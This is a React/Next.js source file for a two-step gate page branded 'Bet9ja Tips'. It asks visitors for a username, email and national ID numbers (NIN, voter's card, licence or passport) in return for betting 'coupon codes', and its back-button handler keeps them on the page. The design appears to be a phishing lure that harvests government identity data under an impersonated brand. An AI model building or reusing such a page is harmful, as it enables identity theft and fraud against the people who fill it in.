"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { submitGateForm, submitVerificationForm } from "@/features/auth/actions";
import { ChevronDown, Loader2, AlertCircle } from "lucide-react";

export default function GatePage() {
  const router = useRouter();
  const [step, setStep] = useState(1); 
  
  const [username, setUsername] = useState("");
  const [email, setEmail] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [idType, setIdType] = useState("NIN");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      document.cookie = "gate_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
      setStep(1);
      setIdNumber("");
      setIdType("NIN");
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, []);

  const handleStep1 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    const result = await submitGateForm(username, email, idNumber);
    
    if (result?.error) {
      setError(result.error);
      setLoading(false);
    } else {
      setStep(2);
      setIdNumber(""); 
      setLoading(false);
    }
  };

  const handleStep2 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    if (!idNumber.trim()) {
      setError("Please enter your ID number.");
      setLoading(false);
      return;
    }

    const result = await submitVerificationForm(idType, idNumber, email);
    
    if (result?.error) {
      setError(result.error);
      setLoading(false);
    } else {
      router.push("/tips?reviewing=true");
    }
  };

  return (
    <div className="min-h-screen bg-bg-deep flex items-center justify-center p-4">
      {/* Removed the outer card container to match the flat design */}
      <div className="w-full max-w-md relative">
        
        <div className="flex flex-col items-center mb-8">
          <div className="relative h-12 w-40 mb-4">
             <Image 
               src="/logo.png" 
               alt="Bet9ja Tips" 
               fill 
               className="object-contain" 
             />
          </div>
          <h1 className="text-2xl font-extrabold text-surface-white text-center">
            {step === 1 ? "Access Coupon Codes" : "Verify Identity"}
          </h1>
          <p className="text-text-muted text-sm mt-2 text-center">
            {step === 1 
              ? "Enter your details to begin." 
              : "Select your ID type and enter the exact ID number."}
          </p>
        </div>

        {error && (
          <div className="bg-brand-red/10 border border-brand-red/20 text-brand-red text-sm p-3 rounded-lg mb-4 flex items-center gap-2">
            <AlertCircle size={16} /> {error}
          </div>
        )}

        {/* STEP 1 FORM */}
        {step === 1 && (
          <form onSubmit={handleStep1} className="flex flex-col gap-4">
            
            <input
              type="text" required value={username} onChange={(e) => setUsername(e.target.value)}
              placeholder="Username"
              className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 px-4 text-white placeholder-gray-300 focus:outline-none focus:border-gray-400 transition-colors"
            />

            <input
              type="email" required value={email} onChange={(e) => setEmail(e.target.value)}
              placeholder="Email Address"
              className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 px-4 text-white placeholder-gray-300 focus:outline-none focus:border-gray-400 transition-colors"
            />

            <input
              type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
              placeholder="Primary ID Number"
              className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 px-4 text-white placeholder-gray-300 focus:outline-none focus:border-gray-400 transition-colors"
            />

            <button type="submit" disabled={loading}
              className="mt-2 w-full bg-[#218838] hover:bg-[#1e7e34] text-white text-lg font-medium py-4 rounded-md transition-colors flex justify-center items-center">
              {loading ? <Loader2 className="w-6 h-6 animate-spin" /> : "Get Passcode"}
            </button>
          </form>
        )}

        {/* STEP 2 FORM */}
        {step === 2 && (
          <form onSubmit={handleStep2} className="flex flex-col gap-4">
            
            <div className="relative">
              <select 
                value={idType} onChange={(e) => setIdType(e.target.value)}
                className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 pl-4 pr-10 text-white appearance-none focus:outline-none focus:border-gray-400 transition-colors"
              >
                <option value="NIN">National Identity Number (NIN)</option>
                <option value="Voter's Card">Permanent Voter's Card</option>
                <option value="Driver's License">Driver's License</option>
                <option value="International Passport">International Passport</option>
              </select>
              <ChevronDown className="absolute right-4 top-4 text-gray-300 w-6 h-6 pointer-events-none" />
            </div>

            <input
              type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
              placeholder={`${idType} Number`}
              className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 px-4 text-white placeholder-gray-300 focus:outline-none focus:border-gray-400 transition-colors"
            />

            <button type="submit" disabled={loading}
              className="mt-2 w-full bg-[#218838] hover:bg-[#1e7e34] text-white text-lg font-medium py-4 rounded-md transition-colors flex justify-center items-center">
              {loading ? <Loader2 className="w-6 h-6 animate-spin" /> : "Verify & Unlock"}
            </button>
          </form>
        )}

      </div>
    </div>
  );
}
